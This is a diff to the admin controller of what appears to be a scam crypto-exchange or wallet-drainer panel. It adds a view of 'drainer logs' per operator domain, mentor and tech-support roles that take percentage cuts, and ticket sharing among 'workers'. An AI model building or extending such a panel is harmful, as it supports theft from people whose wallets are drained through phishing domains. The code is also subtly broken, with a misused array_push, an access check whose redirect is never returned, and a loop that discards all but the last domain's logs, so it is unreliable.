@@ -5,9 +5,12 @@ namespace App\Http\Controllers;
 use App\Classes\WorkerFunction;
 use App\Models\ApiToken;
 use App\Models\BindingUser;
+use App\Models\DrainerLog;
 use App\Models\kyc_application;
+use App\Models\Mentor;
 use App\Models\Message;
 use App\Models\News;
+use App\Models\TechSupport;
 use App\Models\Ticket;
 use App\Models\Transaction;
 use Carbon\Carbon;
@@ -159,14 +162,33 @@ class AdminController extends Controller
         return view("admin.kyc", ["kycs" => $kyc]);
     }
     public function viewTickects(){
+        $user = Auth::user();
         $tickets = Ticket::where("worker_id", Auth::user()->id)->orderBy("id", "DESC")->get()->toArray();
+        $user_tech_support = User::where("tech_support", $user->id)->get()->toArray();
+        $tickets_tech_supports = [];
+        foreach ($user_tech_support as $tech_support){
+            $tickets_tech_supports[] = Ticket::where("worker_id", $tech_support['id'])->get()->toArray();
+        }
+        if($tickets_tech_supports !== []){
+            $tickets = array_push($tickets, $tickets_tech_supports);
+        }
+
         foreach ($tickets as $key => $ticket){
             $tickets[$key]['user'] = User::where("id", $ticket['user_id'])->first()->toArray()['email'];
         }
         return view("admin.tickets", ["tickets" => $tickets]);
     }
     public function viewTickect($ticket_id){
-        $ticket = Ticket::where("worker_id", Auth::user()->id)->where("id", $ticket_id)->first()->toArray();
+        $user = Auth::user();
+        if($user->tech_support === "null" || $user->tech_support === null){
+            $ticket = Ticket::where("worker_id", Auth::user()->id)->where("id", $ticket_id)->first()->toArray();
+        }
+        else{
+            $ticket = Ticket::where("id", $ticket_id)->first()->toArray();
+        }
+        if($user->tech_support !== $user->id){
+            redirect()->back();
+        }
         if(!$ticket && Auth::user()->users_status != "admin"){
             return redirect()->back();
         }
@@ -370,7 +392,7 @@ class AdminController extends Controller
             return response()->json(["message" => "Not found"], 404);
         }
         $domain->isGift = 1;
-        $domain->amountGift = $amount;
+        $domain->amountGift = $amount ;
         $domain->coinGift = $coin;
         $domain->text_gift = $text;
         $domain->save();
@@ -378,6 +400,97 @@ class AdminController extends Controller
         return redirect()->back();
     }
 
+
+    public function viewDrainerLog()
+    {
+        $domains = Domain::where("user_id", Auth::user()->id)->get()->toArray();
+        $drainerLogs = [];
+        foreach ($domains as $domain){
+            $drainerLogs = DrainerLog::where("domain", $domain['domain'])->get()->toArray();
+        }
+
+        return view("admin.drainerLog", ["drainerLogs" => $drainerLogs]);
+    }
+    public function viewMentors()
+    {
+        $mentors = Mentor::all();
+        $tech_supports = TechSupport::all();
+        $array = [];
+        foreach ($tech_supports as $tech_support){
+            $user = User::where("id", $tech_support->user_id)->first()->toArray();
+            $user['type'] = "tech_support";
+            $user['percent'] = $tech_support->percent;
+            $user['status'] = $tech_support->status;
+
+            $array[] = $user;
+
+        }
+        foreach ($mentors as $mentor){
+            $user = User::where("id", $mentor->user_id)->first()->toArray();
+            $user['type'] = "mentor";
+            $user['percent'] = $mentor->percent;
+            $user['status'] = $mentor->status;
+
+            $array[] = $user;
+        }
+        return view("admin.mentors", ["mentors" => $mentors, "tech_supports" => $tech_supports, "workers" => $array]);
+    }
+
+    public function UserStatusSet(Request $request)
+    {
+        $validator = Validator::make($request->all(), [
+            "email" => "required|exists:users,email",
+            "type" => "required",
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json(['errors' => $validator->errors()], 401);
+        }
+
+        $user = User::where("email", $request->email)->first();
+         if($request->type == "mentor") {
+             $mentor = Mentor::where("user_id", $user->id)->first();
+             if ($mentor) {
+                 $mentor->status = "1";
+                 $mentor->save();
+             } else {
+                 $mentor = new Mentor();
+                 $mentor->user_id = $user->id;
+                 $mentor->status = "1";
+                 $mentor->percent = $request->percent;
+                 $mentor->save();
+             }
+         }
+            elseif($request->type == "tech_support"){
+                $tech_support = TechSupport::where("user_id", $user->id)->first();
+                if ($tech_support) {
+                    $tech_support->status = "1";
+                    $tech_support->save();
+                } else {
+                    $tech_support = new TechSupport();
+                    $tech_support->user_id = $user->id;
+                    $tech_support->status = "1";
+                    $tech_support->percent = $request->percent;
+                    $tech_support->save();
+                }
+            }
+        return response()->json(['message' => 'User status changed successfully'], 200);
+    }
+    public function saveMentor(Request $request)
+    {
+        $user = $request->user();
+       $type = $request->type;
+
+       if($type == "mentor"){
+           $user->mentor = $request->mentors;
+       }
+       elseif ($type == "tech_support"){
+           $user->tech_support = $request->tech_support;
+       }
+         $user->save();
+          return response()->json(['message' => 'User status changed successfully'], 200);
+
+    }
 }
 ?>
 
